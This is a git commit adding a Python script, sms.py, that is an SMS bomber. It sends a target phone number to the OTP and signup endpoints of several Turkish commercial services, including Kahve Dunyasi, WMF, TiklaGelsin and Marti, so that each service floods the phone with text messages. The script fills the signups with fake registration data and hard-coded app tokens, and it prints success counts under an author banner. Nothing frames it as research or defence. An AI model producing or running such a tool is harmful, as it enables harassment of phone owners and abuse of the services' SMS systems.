b3a33885d8896807e8692477288aca0dc302a4eb
yagizruzgar49 <146601252+yagizruzgar49@users.noreply.github.com>
2023-10-01 04:59:17 +0300

    Add files via upload

---
+++ sms.py
@@ -0,0 +1,154 @@
+import requests
+from random import choice
+from string import ascii_lowercase
+from colorama import Fore, Style
+
+
+class SendSms():
+    adet = 0
+    
+    def __init__(self, phone, mail):
+        self.phone = str(phone)
+        if len(mail) != 0:
+            self.mail = mail
+        else:
+            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"
+
+
+    #kahvedunyasi.com
+    def KahveDunyasi(self):    
+        try:    
+            kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
+                "mobile_number": self.phone,
+                "token_type": "register_token"
+            })
+            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
+                print(f"{Fore.LIGHTGREEN_EX}Made By yagizruzgar49 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com")
+                self.adet += 1
+            else:
+                raise
+        except:    
+            print(f"{Fore.LIGHTRED_EX}Made By yagizruzgar49 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
+        
+     
+    #wmf.com.tr
+    def Wmf(self):
+        try:
+            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
+                "confirm": "true",
+                "date_of_birth": "1956-03-01",
+                "email": self.mail,
+                "email_allowed": "true",
+                "first_name": "Memati",
+                "gender": "male",
+                "last_name": "Bas",
+                "password": "31ABC..abc31",
+                "phone": f"0{self.phone}"
+            })
+            if wmf.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}Made By yagizruzgar49 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
+                self.adet += 1   
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}Made By yagizruzgar49 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
+    
+     #tiklagelsin.com
+    def TiklaGelsin(self):
+        try:
+            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
+            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
+            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
+            r = requests.post(url, headers=headers, json=json)
+            if r.json()["data"]["generateOtp"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}Made By yagizruzgar49 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}Made By yagizruzgar49 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
+    
+
+    #ayyildiz.com.tr
+    def Ayyildiz(self):
+        try:
+            url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={self.phone}"
+            headers = {"Accept": "*/*", "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS", "Devicetype": "mobileapp", "Accept-Encoding": "gzip, deflate", "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"}
+            r = requests.post(url, headers=headers)
+            if r.json()["Success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}Made By yagizruzgar49 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.altinyildizclassics.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}Made By yagizruzgar49 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.altinyildizclassics.com")
+
+
+    #naosstars.com
+    def Naosstars(self):
+        try:
+            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
+            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul", "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
+            json={"telephone": f"+90{self.phone}", "type": "register"}
+            r = requests.post(url, headers=headers, json=json)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}Made By yagizruzgar49 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}Made By yagizruzgar49  | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")
+
+
+   
+
+    
+            
+        
+    #marti.tech
+    def Marti(self):
+        try:
+            url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"
+            json={"mobilePhone": self.phone, "mobilePhoneCountryCode": "90", "oneSignalId": ""}
+            r = requests.post(url,  json=json)
+            if r.json()["isSuccess"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}Made By yagizruzgar49  | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}Made By yagizruzgar49  | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")
+
+
+    #heyscooter.com.tr
+    def Hey(self):
+        try:
+            url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
+            headers = {"Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
+            r = requests.post(url, headers=headers)
+            if r.json()["IsSuccess"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}Made By yagizruzgar49  | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}Made By yagizruzgar49  | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")
+            
+    #tiklagelsin.com
+    def TiklaGelsin(self):
+        try:
+            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
+            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
+            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
+            r = requests.post(url, headers=headers, json=json)
+            if r.json()["data"]["generateOtp"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}Made By yagizruzgar49  | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}Made By yagizruzgar49  | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
+    
+            
+
+  
